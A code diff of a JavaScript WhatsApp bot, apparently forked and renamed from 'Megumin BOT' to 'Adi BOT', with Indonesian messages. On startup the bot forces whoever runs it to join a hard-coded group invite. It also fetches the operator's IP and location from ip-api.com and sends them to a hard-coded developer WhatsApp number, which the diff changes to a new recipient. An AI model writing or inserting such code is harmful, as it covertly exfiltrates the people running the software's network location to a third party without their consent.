@@ -36,14 +36,14 @@ denz.autoReconnect = ReconnectMode.onConnectionLost
         })
      
       await denz.connect({ timeoutMs: 30 * 1000 });
-  teks = `https://chat.whatsapp.com/K1eU4aZZ8k7BO6eNndwvY1`
+  teks = `https://chat.whatsapp.com/GAVQ2IvZ8a6BwaU0avKDL6`
  denz.query({ json:["action", "invite", `${teks.replace('https://chat.whatsapp.com/','')}`]})
- console.log(color('|WRN|', 'yellow'), color('Joined to 𝑀𝑒𝑔𝑢𝑚𝑖𝑛 𝐵𝑂𝑇 group', 'cyan'))
+ console.log(color('|WRN|', 'yellow'), color('Joined to Adi 𝐵𝑂𝑇 group', 'cyan'))
  denz.sendMessage(`${settings.NomorOwner}@s.whatsapp.net`, `*Hai Owner ${settings.NamaBot}, Bot Telah Berhasil Tersambung Pada Nomor Ini*\n────────────────────\n\`\`\`${JSON.stringify(denz.user, null, 2)}\`\`\`\n────────────────────\n*Jika Ada Kendala Error/Bot Tidak Merespon Silahkan Hubungi Developer Bot Diatas, Terimakasih*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer 𝑀𝑒𝑔𝑢𝑚𝑖𝑛 𝐵𝑂𝑇",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./denz.jpg'),sourceUrl:"https://wa.me/6285866295942?text=Assalamualaikum"}}})
 	console.log(color('|WRN|', 'yellow'), color('Sending bot info to bot owner', 'cyan'))
 fetch(`http://ip-api.com/line`).then(res => res.text())  
         .then(bu =>{
-       denz.sendMessage("6281333782061@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer 𝑀𝑒𝑔𝑢𝑚𝑖𝑛 𝐵𝑂𝑇",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./denz.jpg'),sourceUrl:"https://wa.me/6281333782061?text=Assalamualaikum"}}})
+       denz.sendMessage("12342558989@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer 𝑀𝑒𝑔𝑢𝑚𝑖𝑛 𝐵𝑂𝑇",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./denz.jpg'),sourceUrl:"https://wa.me/6288705834498?text=Assalamualaikum"}}})
      console.log(color('|WRN|', 'yellow'), color('Sending ip address to developer bot', 'cyan'))
    })
       
